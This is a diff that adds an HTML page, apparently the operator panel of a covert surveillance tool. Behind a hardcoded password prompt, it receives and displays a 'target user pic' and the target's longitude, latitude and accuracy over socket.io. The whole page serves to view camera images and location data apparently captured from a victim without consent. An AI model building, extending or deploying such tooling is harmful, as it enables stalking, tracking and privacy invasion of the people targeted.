@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Tag Example</title>
+    <style>
+
+
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0px;
+            align-items: center;
+            justify-content: center;
+             }
+
+        .img {
+            width:100px;
+            height:100px;
+            margin-top: 20px;
+            border: 2px solid #ccc;
+            border-radius:5px;
+            }
+
+        h1 {
+            color: #333;
+            margin-top: 20px;
+           }
+
+        p{
+            width:360px;
+            padding:0px;
+         }
+
+    </style>
+</head>
+<body>
+    <h1>target user pic</h1>
+
+    <p id="p">getting location....</p>
+
+  <script src="/socket.io/socket.io.js"></script>
+ 
+  <script>
+
+     let pass=prompt("enter password : ");
+        
+    while(pass != "hello00"){
+       pass=prompt("enter password : ");
+         }
+
+     const socket=io();
+     //const img= document.getElementById('i');
+     const p= document.getElementById('p');
+
+  
+     socket.on("himg",(dimg)=>{
+      const img = document.createElement('img');
+      img.src = dimg;
+      img.className = 'img';
+      document.body.appendChild(img);     
+     });
+     
+
+
+      socket.on("loc",(ldata)=>{
+       p.innerText=`longitude  : ${ldata.lotd} ,lattitude : ${ldata.latd} ,accuracy :${ldata.acc},__err: ${ldata.err}`;       
+      });
+
+</script>
+
+
+
+</body>
+</html>
